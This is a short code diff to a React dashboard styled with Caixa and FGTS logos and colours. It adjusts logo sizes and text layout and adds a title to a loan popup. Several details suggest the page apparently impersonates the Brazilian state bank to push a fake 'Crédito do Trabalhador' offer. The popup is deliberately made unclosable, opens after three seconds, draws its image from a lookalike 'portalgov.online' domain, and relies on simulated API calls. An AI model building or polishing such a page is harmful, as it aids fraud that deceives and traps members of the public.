@@ -3,7 +3,7 @@ import React, { useEffect, useState } from 'react';
 import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
-import { Dialog, DialogContent } from "@/components/ui/dialog";
+import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog";
 import { Button } from '@/components/ui/button';
 import { useNavigate } from 'react-router-dom';
 import { useIsMobile } from '@/hooks/use-mobile';
@@ -64,7 +64,7 @@ const Dashboard = () => {
         simulateApiCall();
       }
       
-      // Set timeout for popup to appear after 3 seconds (changed from 5)
+      // Set timeout for popup to appear after 3 seconds
       const popupTimer = setTimeout(() => {
         setShowPopup(true);
       }, 3000);
@@ -91,8 +91,8 @@ const Dashboard = () => {
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
       {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
-        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
-        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
+        <FGTSLogo className={`${isMobile ? 'h-6 w-24' : 'h-10'}`} />
+        <CaixaLogo className={`${isMobile ? 'h-6 w-24' : 'h-10'}`} />
       </div>
 
       {/* Welcome */}
@@ -200,7 +200,7 @@ const Dashboard = () => {
               <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                 <DollarSign size={24} className="text-white" />
               </div>
-              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
+              <span className="text-xs mt-1 text-[#FF8C00] text-center">Mais Saques</span>
             </div>
             <div className="flex flex-col items-center text-gray-500">
               <HelpCircle size={24} />
@@ -217,13 +217,14 @@ const Dashboard = () => {
       {/* Loan Popup - Modified to not be closable */}
       <Dialog open={showPopup} onOpenChange={() => {}}>
         <DialogContent className="max-w-[350px] rounded-lg px-4 py-4 bg-white">
+          <DialogTitle className="sr-only">Crédito do Trabalhador</DialogTitle>
           <div className="flex flex-col items-start space-y-3">
             {/* Credit image */}
-            <div className="w-full flex justify-center mb-2">
+            <div className="w-full h-40 flex justify-center mb-2">
               <img 
                 src="https://portalgov.online/credito.png" 
                 alt="Crédito" 
-                className="w-full object-contain" 
+                className="w-full h-full object-contain" 
               />
             </div>
             
